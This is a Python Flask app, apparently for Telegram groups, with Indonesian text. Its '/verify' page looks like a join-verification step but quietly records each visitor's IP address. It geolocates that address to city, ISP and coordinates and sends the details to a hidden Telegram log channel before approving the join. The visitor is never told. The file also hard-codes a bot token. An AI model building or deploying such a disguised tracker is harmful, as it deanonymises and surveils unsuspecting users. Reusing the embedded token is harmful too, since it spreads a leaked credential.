from flask import Flask, request
import requests
import os
from datetime import datetime

BOT_TOKEN = "8901021055:AAGm6x5-1SY_6v2tNRXBZruygRXt29r8KVI"
LOG_CHANNEL = "-1002290475903"

app = Flask(__name__)

@app.route('/verify')
def verify():
    chat_id = request.args.get('chat_id')
    user_id = request.args.get('user_id')
    name = request.args.get('name', 'User')

    if not chat_id or not user_id:
        return "Link tidak valid.", 400

    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()

    geo = {}
    try:
        geo_resp = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,regionName,city,isp,lat,lon", timeout=5)
        if geo_resp.status_code == 200:
            geo = geo_resp.json()
    except:
        pass

    location = f"{geo.get('city', 'Unknown')}, {geo.get('regionName', '')} - {geo.get('country', 'Unknown')}"

    log_text = f"""
🔥 NEW MEMBER DETECTED

👤 Nama: {name}
🆔 User ID: <code>{user_id}</code>
🌐 IP: <code>{ip}</code>
📍 Lokasi: {location}
🏢 ISP: {geo.get('isp', 'Unknown')}
⏰ Waktu: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}
    """

    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": LOG_CHANNEL, "text": log_text, "parse_mode": "HTML"})
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/approveChatJoinRequest", json={"chat_id": chat_id, "user_id": user_id})

    return "<h2 style='text-align:center; margin-top:100px; color:green;'>✅ Verifikasi Berhasil!<br><br>Kamu sudah di-approve ke grup.</h2>", 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
